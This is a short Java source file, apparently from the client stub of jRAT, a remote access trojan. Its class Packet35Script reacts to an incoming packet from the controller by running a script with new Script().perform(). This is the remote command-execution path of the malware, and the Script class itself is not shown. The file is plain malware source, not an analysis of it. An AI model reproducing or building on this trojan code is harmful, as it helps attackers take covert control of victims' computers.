package su.jrat.stub.packets.incoming;

import su.jrat.stub.Script;

public class Packet35Script extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		new Script().perform();
	}

}
